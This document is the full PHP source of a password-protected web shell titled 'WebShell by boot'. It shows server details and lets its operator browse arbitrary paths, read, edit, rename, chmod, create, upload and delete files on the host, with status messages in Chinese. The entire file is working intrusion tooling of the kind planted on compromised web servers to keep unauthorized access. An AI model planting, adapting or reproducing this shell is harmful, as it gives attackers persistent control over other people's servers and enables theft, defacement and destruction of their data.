<?php @set_time_limit(0);error_reporting(0);session_start();if(!isset($_SESSION['webkey013'])){$_SESSION['webkey013']=$_POST['password'];}
if(md5($_SESSION['webkey013'])!="5704bb6e53d5c94e326c1e9d26fbf902"){?>
<html>
    <head><title>WebShell by boot - 33</title></head>
    <form method="post">
        <input type="password" name="password"/>
        <input type="submit" value="submit"/>
    </form>
</html>
<?php }else{$a=$_REQUEST['type'];$b=$_REQUEST['path'];$c=$_SERVER;$d=$c['DOCUMENT_ROOT'];$e=$c['SCRIPT_FILENAME'];$f=dirname($e);$g=$c['REQUEST_SCHEME']."://".$c['SERVER_NAME'];if(!empty($b)){$e=$b;$f=$b;}if($a==1){$f=$b;}$h=explode('/',$e);if(!is_dir($f)){$f=dirname($f);}$i=false;if(is_readable($f)){$i=true;}$j=false;if(is_writable($f)){$j=true;}$l=str_replace($d,'',$f);$m=$g.$l;?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>WebShell by boot</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<div class="jumbotron text-center" style="padding: 1rem 0rem;">
  <h1 style="font-size:2rem;font-weight: bold;margin: 1rem 0;">WebShell by boot</h1>
</div>
<div class="container">
  <div class="row">
      <p>Server IP: <?php echo $c['SERVER_ADDR'];?></p>
      <p>Server Software: <?php echo $c['SERVER_SOFTWARE'];?></p>
      <p>OS: <?php echo PHP_OS;?></p>
      <p>Website: <?php echo $c['HTTP_HOST'];?></p>
      <p>User: <?php echo get_current_user();?></p>
      <p>
            <a href="?path=<?php echo $d;?>">Project</a>
      </p>
  </div>
  <div class="row">
      <p>
          Path: 
          <?php  $n="";foreach($h as $o=>$p){?>
            <?php if(empty($p)){?>
            <a href="?path=/">-</a>
            <?php }else{if(empty($q)){$q=$p;}else{$q=$q.'/'.$p;}$n=$n."/".$p;?>
                    /<a href="?path=<?php echo $n;?>"><?php echo trim($p);?></a><?php }?>
          <?php }?>
          &nbsp;&nbsp;&nbsp;&nbsp;<span <?php if($i){?>style="color:green;"<?php }else{?>style="color:red;"<?php }?>>Readable</span> | <span <?php if($j){?>style="color:green;"<?php }else{?>style="color:red;"<?php }?>>Writeable</span>
      </p>
  </div>
  <?php if($a==2||$a==3){if($a==3){$r=$_REQUEST['file_content'];$s=file_put_contents($b,$r);if($s){echo '<div class="alert alert-success" role="alert">修改文件内容成功!</div>';}else{echo '<div class="alert alert-danger" role="alert">修改文件内容失败!</div>';}}?>
    <div class="row">
        <form action="?type=3" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $e;?>"/>
          <div class="form-group">
             <?php $t=file_get_contents($e);?>
            <textarea class="form-control" id="exampleFormControlTextarea1" name="file_content" rows="20" cols="100"><?php echo htmlspecialchars($t);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
  <?php }else if($a==4){$u=$_POST['file_new_name'];if(!empty($u)){$w=rename($e,$f.'/'.$u);if($w){echo '<div class="alert alert-success" role="alert">修改文件名称成功!</div>';$e=$f.'/'.$u;}else{echo '<div class="alert alert-danger" role="alert">修改文件名称失败!</div>';}}?>
    <div class="row">
        <form action="?type=4" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $e;?>"/>
          <div class="form-group">
             <?php $t=file_get_contents($e);?>
             <input type="text" class="form-control" id="file_new_name" name="file_new_name" value="<?php echo basename($e);?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($a==5){$x=trim($_POST['new_chmod']);if(!empty($x)){if(chmod($e,octdec($x))){echo '<div class="alert alert-success" role="alert">修改文件权限成功!</div>';$y=$x;}else{echo '<div class="alert alert-danger" role="alert">修改文件权限失败!</div>';}}else{$z=fileperms($e);$y=substr(sprintf('%o',$z),-4);}?>
    <div class="row">
        <form action="?type=5" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $e;?>"/>
          <div class="form-group">
             <?php $t=file_get_contents($e);?>
             <input type="text" class="form-control" id="new_chmod" name="new_chmod" value="<?php echo $y;?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($a==6){$aa=trim($_POST['new_name']);$bb=trim($_POST['new_content']);if(!empty($aa)){if(is_file($f.'/'.$aa)){echo '<div class="alert alert-danger" role="alert">文件已经存在!</div>';}else{$cc=fopen($f.'/'.$aa,'w');if($cc){if(fwrite($cc,$bb)){echo '<div class="alert alert-success" role="alert">文件创建成功!</div>';}else{echo '<div class="alert alert-danger" role="alert">无法写入文件!</div>';}fclose($cc);}else{echo '<div class="alert alert-danger" role="alert">无法打开文件!</div>';}}}?>
    <div class="row">
        <form action="?type=6" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $e;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $aa;?>" placeholder="New File Name">
          </div>
          <div class="form-group">
             <textarea class="form-control" id="new_content" name="new_content" rows="20" cols="100" placeholder="New File Content"><?php echo htmlspecialchars($bb);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
    <?php }else if($a==7){$aa=trim($_POST['new_name']);if(!empty($aa)){if(!is_dir($f.'/'.$aa)){if(mkdir($f.'/'.$aa)){echo '<div class="alert alert-success" role="alert">目录创建成功!</div>';}else{echo '<div class="alert alert-success" role="alert">目录创建失败!</div>';}}else{echo '<div class="alert alert-success" role="alert">目录已存在!</div>';}}?>
    <div class="row">
        <form action="?type=7" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $e;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $aa;?>" placeholder="New Folder Name">
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
  <?php }else{?>
  <?php  if($_POST['act']=='del'){$dd=$_POST['childcheck'];if(!empty($dd)){$ee=0;$ff=0;foreach($dd as $o=>$p){$gg=unlink($p);if($gg){$ee++;}else{$ff++;}}if($ee>0){echo '<div class="alert alert-success" role="alert">删除'.$ee.'个文件成功!</div>';}if($ff>0){echo '<div class="alert alert-danger" role="alert">删除'.$ff.'个文件失败!</div>';}}}if($_POST['act']=='upload'){$hh=$f.'/'.basename($_FILES["fileToUpload"]["name"]);if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],$hh)){echo '<div class="alert alert-success" role="alert">文件'.htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).'已上传!</div>';}else{echo '<div class="alert alert-danger" role="alert">文件上传失败!</div>';}}$ii=scandir($f);$ii=sortByFolder($f,$ii);?>
  <div class="row">
      <div class="col-12" style="margin-bottom: 1rem;">
        <form action="?path=<?php echo $e;?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="act" value="upload"/>
            <input class="form-control form-control-sm" id="formFileSm" name="fileToUpload" type="file" style="width: 200px;display: inline-block;">
            <button type="submit" class="btn btn-info btn-sm">Upload</button>
            <a class="btn btn-primary btn-sm" href="?path=<?php echo $e;?>&type=6">Create File</a>
            <a class="btn btn-success btn-sm" href="?path=<?php echo $e;?>&type=7">Create Folder</a>
        </form>
      </div>
      <form action="?path=<?php echo $e;?>" method="post">
      <div class="col-12" style="margin-bottom: 1rem;">
        <input type="hidden" name="act" value="del"/>
        <button type="submit" class="btn btn-danger btn-xs">Delete</button>
      </div>
      <table class="table table-bordered">
        <thead>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="1" id="allcheck" name="allcheck">
                </div>
            </th>  
            <th>Name</th>
            <th>Url</th>
            <th>Size</th>
            <th>Modify</th>
            <th>Permission</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          <?php  if(!empty($ii)&&count($ii)>2){foreach($ii as $o=>$p){if(!($p=='.'||$p=='..')){$jj=$f.'/'.$p;?>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="<?php echo $jj;?>" name="childcheck[]">
                </div>
            </th> 
            <td>
                <?php  if(is_dir($jj)){echo '<a href="?path='.$jj.'&type=1" style="color: green;font-weight:bold;">
                     <i class="bi bi-folder" style="vertical-align: middle;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-folder" viewBox="0 0 16 16">
                        <path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z"/>
                        </svg>
                    </i>'.$p.'</a>';}else{echo '<a href="?path='.$jj.'&type=2">'.$p.'</a>';}?>
            </td>
            <td>
                <?php if(!is_dir($jj)){?>
                <a href="<?php echo $m.'/'.$p;?>" target="_blank">click visit</a>
                <?php }?>
            </td>
            <td>
                <?php  if(is_dir($jj)){echo '<font color="green" style="font-weight: bold;">Directory</font>';}else{echo getFileSize($jj);}?>
            </td>
            <td>
                <?php  $kk=filemtime($jj);echo date("Y-m-d H:i:s",$kk);?>
            </td>
            <td>
                <?php $ll=getFilePermission($jj);if(strpos($ll,'w')!==false){echo '<font color="green" style="font-weight: bold;">'.$ll.'</font>';}else{echo '<font color="red" style="font-weight: bold;">'.$ll.'</font>';}?>
            </td>
            <td>
                <a class="btn btn-primary btn-xs" href="?path=<?php echo $jj;?>&type=4">Rename</a>
                <a class="btn btn-info btn-xs" href="?path=<?php echo $jj;?>&type=2">Edit</a>
                <a class="btn btn-warning btn-xs" href="?path=<?php echo $jj;?>&type=5">Chmod</a>
            </td>
          </tr>
          <?php }}}else{?>
          <tr>
              <td colspan="4" style="text-align: center;color:red;">
                  No Files!
              </td>
          </tr>
          <?php }?>
        </tbody>
      </table>
      </form>
  </div>
  <?php }?>
</div>
<script>
    $(function(){
        $('#allcheck').click(function(){
            if($('#allcheck').is(":checked")){
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', true);
                })
            }else{
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', false);
                })
            }
        })
    })
</script>
<?php }function getFileSize($jj){$mm=filesize($jj);if($mm>1024*1024){$mm=round($mm/(1024*1024),2).' MB';}else if($mm>1024){$mm=round($mm/1024,2).' KB';}else{$mm=$mm.' B';}return $mm;}function getFilePermission($nn){clearstatcache(true,$nn);$oo=fileperms($nn);if(($oo&0xC000)===0xC000){$pp='s';}elseif(($oo&0xA000)===0xA000){$pp='l';}elseif(($oo&0x8000)===0x8000){$pp='-';}elseif(($oo&0x6000)===0x6000){$pp='b';}elseif(($oo&0x4000)===0x4000){$pp='d';}elseif(($oo&0x2000)===0x2000){$pp='c';}elseif(($oo&0x1000)===0x1000){$pp='p';}else{$pp='u';}$pp.=(($oo&0x0100)?'r':'-');$pp.=(($oo&0x0080)?'w':'-');$pp.=(($oo&0x0040)?(($oo&0x0800)?'s':'x'):(($oo&0x0800)?'S':'-'));$pp.=(($oo&0x0020)?'r':'-');$pp.=(($oo&0x0010)?'w':'-');$pp.=(($oo&0x0008)?(($oo&0x0400)?'s':'x'):(($oo&0x0400)?'S':'-'));$pp.=(($oo&0x0004)?'r':'-');$pp.=(($oo&0x0002)?'w':'-');$pp.=(($oo&0x0001)?(($oo&0x0200)?'t':'x'):(($oo&0x0200)?'T':'-'));return $pp;}function sortByFolder($f,$qq){$rr=array();$ii=array();foreach($qq as $o=>$p){if(is_dir($f.'/'.$p)){$rr[]=$p;}else{$ii[]=$p;}}sort($rr);sort($ii);$qq=array_merge($rr,$ii);return $qq;}?>
</body>
</html>
